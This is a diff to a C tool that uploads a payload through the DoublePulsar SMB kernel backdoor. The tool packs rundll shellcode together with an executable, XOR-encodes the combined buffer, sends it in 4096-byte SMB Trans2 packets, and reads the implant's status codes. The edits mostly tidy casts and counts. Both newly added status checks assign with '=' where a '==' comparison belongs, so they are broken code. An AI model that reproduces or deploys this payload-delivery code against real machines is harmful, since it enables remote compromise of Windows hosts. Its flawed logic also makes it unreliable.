@@ -668,7 +668,7 @@ int main(int argc, char* argv[])
 	memcpy(packet + 3, &smblen, 1);
 
 	//update UserID in modified TreeConnect Request
-	memcpy(packet + 0x20, (char*)&userid, 2); //update userid in packet
+	memcpy(packet + 0x20, (unsigned char*)&userid, 2); //update userid in packet
 
 	//send modified TreeConnect request
 	send(sock, (char*)packet, ptr - packet, 0);
@@ -678,8 +678,8 @@ int main(int argc, char* argv[])
 	treeid = *(WORD*)(recvbuff + 0x1c);       //get treeid
 
 	//Update treeID, UserID
-	memcpy(trans2_request + 28, (char*)&treeid, 2);
-	memcpy(trans2_request + 32, (char*)&userid, 2);
+	memcpy(trans2_request + 28, (unsigned char*)&treeid, 2);
+	memcpy(trans2_request + 32, (unsigned char*)&userid, 2);
 	//might need to update processid
 
 	//if DoublePulsar is enabled, the multiplex ID is incremented by 10
@@ -766,15 +766,15 @@ int main(int argc, char* argv[])
 	PBYTE pFULLBUFFER = new BYTE[payload_totalsize];
 
 	int numberofpackets = payload_totalsize / 4096;
-	int iterations = payload_totalsize % 4096;
+	int remainder = payload_totalsize % 4096;
 	printf("will send %d packets\n ", numberofpackets);
-	printf("%d as a remainder\n", iterations);
+	printf("%d as a remainder\n", remainder);
 
 	memcpy(pFULLBUFFER, kernel_rundll_shellcode, 6144);
 	memcpy(pFULLBUFFER + 6144, pExeBuffer, dwFileSizeLow);
 
 	//unsigned int XorKey = 0x58581162;
-	unsigned char byte_xor_key[5];
+	unsigned char byte_xor_key[4];
 	byte_xor_key[0] = (unsigned char)XorKey;
 	byte_xor_key[1] = (unsigned char)(((unsigned int)XorKey >> 8) & 0xFF);
 	byte_xor_key[2] = (unsigned char)(((unsigned int)XorKey >> 16) & 0xFF);
@@ -800,7 +800,7 @@ int main(int argc, char* argv[])
 
 	unsigned short TotalDataCount = 4096;
 	unsigned short DataCount = 4096;
-	unsigned short byteCount = 4096 + 13;
+	unsigned short byteCount = 4096 + 12;
 
 	unsigned char* big_packet = (unsigned char*)malloc(4096 + 12 + 70);
 	int size_normal_packet = 4096 + 12 + 70;
@@ -944,10 +944,21 @@ int main(int argc, char* argv[])
 			{
 				printf("Doublepulsar returned 82!\n");
 			}
+
+			else if (recvbuff[34] = 0x62)
+			{
+				printf("Doublepulsar returned: Invalid parameters!\n");
+			}
+			
+			else if (recvbuff[34] = 0x72)
+			{
+				printf("Doublepulsar returned: Allocation failure!\n");
+			}
+	
 			else {
 				printf("Doublepulsar didn't work!\n");
 			}
-
+			
 			break;
 		}
 		
@@ -1077,6 +1088,17 @@ int main(int argc, char* argv[])
 		{
 			printf("Doublepulsar returned 82!\n");
 		}
+			
+		else if (recvbuff[34] = 0x62)
+		{
+			printf("Doublepulsar returned: Invalid parameters!\n");
+		}
+			
+		else if (recvbuff[34] = 0x72)
+		{
+			printf("Doublepulsar returned: Allocation failure!\n");
+		}
+				
 		else {
 			printf("Doublepulsar didn't work!\n");
 		}
@@ -1101,8 +1123,8 @@ int main(int argc, char* argv[])
 		"\x00\x08\x41\x00\x00\x00\x00";
 
 	//Update treeID, UserID
-	memcpy((unsigned char*)disconnect_packet + 28, (char*)&treeid, 2);
-	memcpy((unsigned char*)disconnect_packet + 32, (char*)&userid, 2);
+	memcpy((unsigned char*)disconnect_packet + 28, (unsigned char*)&treeid, 2);
+	memcpy((unsigned char*)disconnect_packet + 32, (unsigned char*)&userid, 2);
 
 	//send the disconnect packet
 	send(sock, (char*)disconnect_packet, sizeof(disconnect_packet) - 1, 0);
@@ -1115,8 +1137,8 @@ int main(int argc, char* argv[])
 		"\xfe\x00\x08\x41\x00\x02\xff\x00\x27\x00\x00\x00";
 
 	//Update treeID, UserID
-	memcpy((unsigned char*)logoff_packet + 28, (char*)&treeid, 2);
-	memcpy((unsigned char*)logoff_packet + 32, (char*)&userid, 2);
+	memcpy((unsigned char*)logoff_packet + 28, (unsigned char*)&treeid, 2);
+	memcpy((unsigned char*)logoff_packet + 32, (unsigned char*)&userid, 2);
 
 	//send the logoff packet
 	send(sock, (char*)logoff_packet, sizeof(logoff_packet) - 1, 0);
